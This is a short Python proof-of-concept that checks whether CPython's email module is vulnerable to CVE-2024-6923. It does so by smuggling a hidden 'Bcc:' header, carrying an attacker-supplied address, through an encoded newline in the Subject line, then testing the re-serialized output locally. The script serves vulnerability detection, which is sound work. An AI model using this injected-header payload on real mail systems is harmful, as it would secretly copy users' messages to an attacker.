import argparse
from email import message_from_string
from email.policy import default
from packaging import version



def exploit(attacker_email):
    print("[*] Exploiting the target...")
    email_in = """\
To: admin () vicarius com
From: Shivam Bathla <shivam () vicarius com>
Subject: Here's an =?UTF-8?Q?embedded_newline=0A?=Bcc: {attacker_email}
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0

<html>
<head><title>An embeded newline</title></head>
<body>
  <p>I sent you an embedded newline in the subject. How do you like that?!</p>
</body>
</html>
    """

    email_in = email_in.format(attacker_email = attacker_email)
    msg = message_from_string(email_in, policy=default)

    for header, value in msg.items():
        del msg[header]
        msg[header] = value

    email_out = str(msg)
    # print(email_out)

    if f"\nBcc: {attacker_email}\n" in email_out:
        print("[+] Cpython email module vulnerable to CVE-2024-6923.")
    else:
        print("[-] Cpython email module NOT vulnerable to CVE-2024-6923.")


def main():
    parser = argparse.ArgumentParser(description="Detection script for CVE-2024-6923.")
    parser.add_argument("--attacker-email", required=True, help="Attacker email to send data to (via Bcc).")
    args = parser.parse_args()

    attacker_email = args.attacker_email.rstrip('/')
    exploit(attacker_email)


if __name__ == "__main__":
    main()
